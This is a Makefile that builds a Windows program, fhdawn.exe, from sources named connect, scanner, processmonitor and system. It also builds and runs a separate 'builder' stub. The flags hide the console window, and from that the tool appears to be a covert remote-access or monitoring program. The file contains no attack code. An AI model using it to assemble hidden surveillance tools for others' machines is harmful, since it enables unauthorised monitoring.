win:
	g++ main.cpp system.cpp connect.cpp other.cpp processmonitor.cpp scanner.cpp -o fhdawn.exe -lws2_32 -lpsapi -liphlpapi -static -mwindows
linux:
	i686-w64-mingw32-g++ main.cpp system.cpp connect.cpp other.cpp processmonitor.cpp -o fhdawn.exe -lws2_32 -lpsapi -static -liphlpapi -mwindows

make build-win:
	g++ build.cpp -o builder.exe
	./builder

make build-linux:
	i686-w64-mingw32-g++ build.cpp -o builder.exe -static
	wine builder.exe